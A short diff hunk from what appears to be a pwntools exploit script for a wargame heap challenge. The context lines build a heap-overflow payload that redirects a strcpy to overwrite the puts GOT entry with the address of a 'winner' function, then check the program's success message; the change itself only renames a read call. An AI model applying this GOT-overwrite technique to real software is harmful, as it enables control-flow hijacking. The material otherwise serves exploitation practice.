@@ -17,5 +17,5 @@ data_a = fit({b_data_off: p32(gotputs_addr)})  # override b->data during strcpy(
 data_b = p32(winner_addr)  # strcpy(b->data, av[2]) will copy that at the overrided address
 
 with s.system([args.BIN, data_a, data_b]) as p:
-    ret = p.readline()
+    ret = p.recvline()
     assert ret.startswith('and we have a winner @ ')
